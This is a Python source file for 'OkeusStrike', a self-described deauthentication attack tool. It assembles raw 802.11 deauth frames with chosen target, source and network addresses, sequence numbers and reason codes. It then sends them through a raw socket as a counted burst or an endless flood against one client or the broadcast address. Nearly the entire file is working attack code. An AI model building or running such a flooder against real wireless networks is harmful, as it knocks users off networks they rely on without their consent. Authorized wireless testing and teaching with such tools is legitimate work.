#!/usr/bin/env python3

# OkeusStrike - Advanced Deauthentication Attack Tool - okeus
# Copyright (C) 2025 Richard Smith (Islc12)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

# not all these imports are used in the final code, they are here until I determine exactly which file they will be used in
import socket
import okeusargs
import convert
import reason
import radio
import os
import struct
import sys 
import random
import time
import body
import exit
import platform
from datetime import datetime

def sys_checks():
    if platform.system() != 'Linux':
        print("ATTENTION: This program is intended only to be run on GNU/Linux")
        sys.exit(exit.EXIT_NOT_LINUX)

    if os.geteuid() != 0:
        print("ATTENTION: Script requires root privlages, please run as root")
        sys.exit(exit.EXIT_NOT_ROOT)

def f_assem(args):
    # Parse command-line arguments
    interface = args.netinterface
    dest_mac = args.dest
    source_mac = args.ap_source
    network_bssid = args.net_bssid
    broadcast_attack =  args.broadcast
    frag = args.fragment
    seq_num = args.sequence
    reason_code = args.reason_code
    timedelay = args.delay
    frame_flood = args.flood
    num_frames = args.count
    dur = args.duration
    randfrag = args.randomfrag
    autoseq = args.autoseq
    dry = args.dryrun
    body_bytes = args.body_pad
    verbose = args.verbose

    if any(arg in sys.argv for arg in ("-h", "--help")):
        parser = argparse.ArgumentParser()
        parser.print_help()
        sys.exit(exit.EXIT_SUCCESS)

    
    # starts the 80211 mac header, deauth frame byte
    f_ctl = struct.pack('B', 0xC0)

    # second byte makeup of FCF
    if not (frag or randfrag):
        f_frag = struct.pack('B', 0x00)
        ch = "DEFAULT"
    elif (frag or randfrag):
        f_frag = struct.pack('B', 0x20)
        if frag:
            ch = "MANUAL"
        if randfrag:
            ch = "RANDOM"

    # Duration field
    if not dur:
        f_dur = struct.pack('<H', 0x00)
    if dur:
        f_dur = struct.pack('<H', dur & 0xFFFF)

    # Address 1 field
    if not (broadcast_attack or dest_mac):
        print("Invalid input, need address 1 field")
        sys.exit(exit.EXIT_NO_TARGET)
    if (broadcast_attack and dest_mac):
        print("Invalid arguments, too many addresses in Address 1")
        sys.exit(exit.EXIT_TOO_MANY_ADDR1)
    if broadcast_attack:
        ct = struct.pack('!6B', 0xFF, 0XFF, 0XFF, 0XFF, 0XFF, 0XFF)
    elif dest_mac:
        ct = convert.machex(dest_mac)

    # Address 2 field, if not given Address 3 fills
    if not source_mac:
        src = convert.machex(network_bssid)
        src_n_v = "Source Addres will use Network Address"
    elif source_mac:
        src = convert.machex(source_mac)

    # Address 3 field
    if network_bssid:
        net = convert.machex(network_bssid)
    if not network_bssid:
        print("Invalid argument, missing Address 3")
        sys.exit(exit.EXIT_NO_NETWORKBSSID)

    dr = "Conducting dry run, no frames will be sent."

    td = datetime.now().strftime("Today's Date: %Y-%m-%d\nCurrent Time: %H:%M:%S")

    return f_ctl, f_frag, f_dur, ct, src, net, ch, td, dr, src_n_v

def main():
    args = okeusargs.parse_arguments()

    timedelay = args.delay
    frame_flood = args.flood
    num_frames = args.count
    dur = args.duration
    interface = args.netinterface
    verbose = args.verbose
    dest_mac = args.dest
    source_mac = args.ap_source
    network_bssid = args.net_bssid
    broadcast_attack =  args.broadcast
    frag = args.fragment
    seq_num = args.sequence
    reason_code = args.reason_code
    randfrag = args.randomfrag
    autoseq = args.autoseq
    dry = args.dryrun
    body_bytes = args.body_pad

    f_ctl, f_frag, f_dur, ct, src, net, ch, td, dr, src_n_v = f_assem(args)
    rad, vr, pad, rt_len, fp = radio.rt_head()
    df = rad + f_ctl + f_frag + f_dur + ct + src + net

    sys_checks()

    if not dry:
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.bind((interface, 0))
            if verbose:
                print(s)
        except OSError as es:
            if es.errno == 19:
                print("Unknown network interface")
                sys.exit(exit.EXIT_UNKNOWN_INTERFACE)
            else:
                print(es)
                sys.exit(exit.EXIT_OSERROR)
    elif dry:
        print(dr)

    def reas():
        if not reason_code:
            rc = reason.reasoncode_input(0)
        if reason_code:
            rc = reason.reasoncode_input(reason_code)

        return rc

    def fs():
        if not hasattr(fs, "sn"):
            fs.sn = 1
        if not (frag or seq_num or randfrag or autoseq):
            seq = struct.pack('<H', 0x00)

        elif randfrag and not (frag or seq_num or autoseq):
            rf = random.randint(1, 14)
            seq = struct.pack('<H', rf & 0x0F)
        elif autoseq and not (frag or seq_num or randfrag):
            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
            fs.sn += 1
        elif (autoseq and randfrag) and not (seq_num or frag):
            rf = random.randint(1, 14)
            if rf >= 8:
                seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
                fs.sn += 1
            else:
                seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
        elif (randfrag and seq_num) and not (frag or autoseq):
            rf = random.randint(1, 14)
            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (rf & 0x0F))
        elif frag and not (seq_num or randfrag or autoseq):
            seq = struct.pack('<H', frag & 0x0F)
        elif (frag and autoseq) and not (randfrag or seq_num):
            seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (frag & 0x0F))
            fs.sn += 1
        elif (frag and seq_num) and not (randfrag or autoseq):
            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (frag & 0x0F))
        elif (seq_num) and not (frag or randfrag or autoseq):
            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) )

        return seq

    def verb():
        seq = fs()
        print(td)
        if not source_mac:
            print(src_n_v)
        print(f"Interface: {interface}")
        print("-" * 100)
        print(f"{'Frame composition'.center(100)}")
        print("-" * 100)
        print(f"Radiotap version: {vr.hex()}")
        print(f"Radiotap pad: {pad.hex()}")
        print(f"Radiotap length: {rt_len.hex()}")
        print(f"Radiotap fields present: {fp.hex()}")
        print(f"Frame type: {f_ctl.hex().upper()}")
        print(f"Fragmentation set: {f_frag.hex()} - type: {ch}")
        print(f"Duration: {f_dur.hex().upper()}")
        print(f"Destination: {ct.hex().upper()}")
        print(f"Source: {src.hex().upper()}")
        print(f"Network: {net.hex().upper()}")
        if not (autoseq or randfrag):
            print(f"Sequence Control: {seq.hex().upper()}")
        if (autoseq or randfrag):
            print("Sequence Control: DYNAMIC")
        if not reason_code:
            print(f"Reason Code: {reason.reasoncode_input(0).hex()} - {reason.def_code(0)}")
        if reason_code:
            print(f"Reason Code: {reason.reasoncode_input(reason_code).hex()} - {reason.def_code(reason_code)}")
        if body:
            print(f"Body padding: {body_bytes} null bytes padded")
        print("-" * 100)

    r = reas()
    sq = fs()
    if body_bytes:
        b = body.body_inject(body_bytes)
        frame = df + sq + r + b
    if not body_bytes:
        frame = df + sq + r
    frme = frame.hex().upper()
    frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
    print(f'Frame: {frmes}')

    if frame_flood:
        nmframe = 1

        if verbose:
            verb()
        try:
            tg = ct.hex().upper()
            tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
            print("Starting deauth attack") 
            print(f"Flooding: {tgt}\nEnd attack with CTRL + C")
            if num_frames:
                n = num_frames
                print(f"Sending {n} frames.")
            elif not num_frames:
                n = -1

            if timedelay:
                t = timedelay / 1000
                print(f"Delay of {timedelay} ms")
            elif not timedelay:
                t = .1
            while nmframe != n:
                try:
                    if not dry:
                        s.send(frame)
                    time.sleep(t)
                    nmframe += 1
                except OSError as eos:
                    if eos.errno == 100:
                        time.sleep(1)
                        continue
        except KeyboardInterrupt:
            print("\nEnding flood attack")

        except Exception as e:
            print(f"Error: {e}")

        finally:
            print(f"Sent {nmframe} frames to {tgt}")
            if not dry:
                if verbose:
                    print(f"Socket {s} closed")
                s.close()
            print("Completed!!!")

    if not frame_flood:
        if timedelay:
            t = timedelay / 1000
            ti = timedelay
        if not timedelay:
            if verbose:
                print("Default setting is no delay between frames")
            ti = 0
            t = ti
        if num_frames:
            n = num_frames
        if not num_frames:
            if verbose:
                print("Default setting sends 1 frame")
            n = 1
        try:
            if verbose:
                verb()
            if timedelay:
                print(f"Sending {n} frame(s) at a rate of {ti} ms.")
            if not timedelay:
                print(f"Sending {n} frame(s)")
            print("Starting deauth attack")
            for i in range(n):
                try:
                    if not dry:
                        s.send(frame)
                    if verbose:
                        print(f"Sending frame: {i + 1}/{n}")
                        if timedelay:
                            if ti == 0:
                                print("")
                            elif 0 < ti < 1000:
                                print(f"Waiting {ti} ms...")
                            elif ti >= 1000:
                                print(f"Waiting {ti / 1000} second(s)...")
                    time.sleep(t)
                except OSError as eos:
                    if eos.errno == 100:
                        time.sleep(1)
                        continue
        except KeyboardInterrupt:
            print("\n")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            if not dry:
                if verbose:
                    print(f"Socket {s} closed")
                s.close()
            print("Completed!!!")
            sys.exit(exit.EXIT_SUCCESS)

if __name__ == "__main__":
    main()